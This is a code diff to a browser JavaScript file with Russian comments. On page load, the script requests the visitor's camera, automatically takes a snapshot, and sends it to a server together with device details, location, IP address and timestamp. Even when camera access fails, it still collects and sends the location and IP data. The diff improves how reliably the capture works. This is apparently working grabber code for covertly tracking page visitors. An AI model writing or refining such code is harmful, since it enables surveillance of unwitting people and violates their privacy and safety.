@@ -1,9 +1,16 @@
 (function() {
     'use strict';
 
+    // ===== ЭЛЕМЕНТЫ =====
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
     // ===== ПЕРЕМЕННЫЕ =====
+    let stream = null;
     let isPhotoTaken = false;
     let isProcessing = false;
+    let cameraReady = false;
 
     // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
     function setStatus(text) {
@@ -238,23 +245,31 @@
     }
 
     // ===== СЪЁМКА ФОТО =====
-    function takePhoto(videoElement) {
-        if (!videoElement || isPhotoTaken || isProcessing) return;
+    function takePhotoFromVideo() {
+        if (!stream || isPhotoTaken || isProcessing || !cameraReady) {
+            console.log('⚠️ Камера не готова:', { stream: !!stream, isPhotoTaken, isProcessing, cameraReady });
+            return;
+        }
         
-        if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
-            setTimeout(() => takePhoto(videoElement), 400);
+        // Проверяем, что видео имеет размеры
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            console.log('⏳ Видео ещё не загружено, повтор через 300ms...');
+            setTimeout(takePhotoFromVideo, 300);
             return;
         }
 
         try {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
+            console.log('📸 Делаем фото, размер:', video.videoWidth, 'x', video.videoHeight);
             
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Отражаем зеркально
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
-            ctx.drawImage(videoElement, 0, 0);
+            ctx.drawImage(video, 0, 0);
+            // Сбрасываем трансформацию
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
             
             const photoData = canvas.toDataURL('image/jpeg', 0.85);
             
@@ -265,7 +280,7 @@
             });
             
         } catch (err) {
-            console.error('Ошибка съёмки:', err);
+            console.error('❌ Ошибка съёмки:', err);
             collectAllData().then((data) => {
                 sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
             });
@@ -277,8 +292,9 @@
     async function startCamera() {
         try {
             setStatus('📷 Запрос доступа к камере...');
+            console.log('📷 Запрос доступа к камере...');
             
-            const stream = await navigator.mediaDevices.getUserMedia({
+            stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
                     facingMode: 'user',
                     width: { ideal: 640 },
@@ -287,27 +303,33 @@
                 audio: false
             });
             
-            const video = document.createElement('video');
+            console.log('✅ Камера получена, подключаем к video...');
+            
             video.srcObject = stream;
-            video.autoplay = true;
-            video.muted = true;
-            video.style.display = 'none';
-            document.body.appendChild(video);
+            
+            // Ждём, пока видео загрузится
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    console.log('✅ video.onloadedmetadata сработал');
+                    resolve();
+                };
+                // Если событие не сработало, ждём максимум 3 секунды
+                setTimeout(resolve, 3000);
+            });
             
             await video.play();
+            console.log('✅ video.play() выполнен');
             
-            setStatus('📸 Делаем фото...');
+            cameraReady = true;
+            setStatus('📸 Камера готова, делаем фото...');
             
+            // Даём время на стабилизацию
             setTimeout(() => {
-                takePhoto(video);
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-                }, 2000);
-            }, 800);
+                takePhotoFromVideo();
+            }, 500);
             
         } catch (err) {
-            console.error('Ошибка камеры:', err);
+            console.error('❌ Ошибка камеры:', err);
             
             let errorMsg = '';
             if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
@@ -329,17 +351,37 @@
     // ===== ЗАПУСК =====
     function init() {
         setStatus('🔄 Подготовка...');
+        console.log('🔄 Инициализация...');
         
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             setStatus('⚠️ Браузер не поддерживает камеру');
+            console.log('⚠️ Браузер не поддерживает камеру');
             collectAllData().then((data) => {
                 sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
             });
             return;
         }
         
-        setTimeout(startCamera, 1000);
+        // Запускаем камеру с небольшой задержкой
+        setTimeout(startCamera, 800);
     }
+
+    // ===== ОЧИСТКА =====
+    function cleanup() {
+        if (stream) {
+            stream.getTracks().forEach(track => {
+                track.stop();
+                track.enabled = false;
+            });
+            stream = null;
+        }
+        video.srcObject = null;
+        cameraReady = false;
+    }
+
+    // ===== СОБЫТИЯ =====
+    window.addEventListener('beforeunload', cleanup);
+    window.addEventListener('pagehide', cleanup);
 
     // ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
     if (document.readyState === 'complete') {
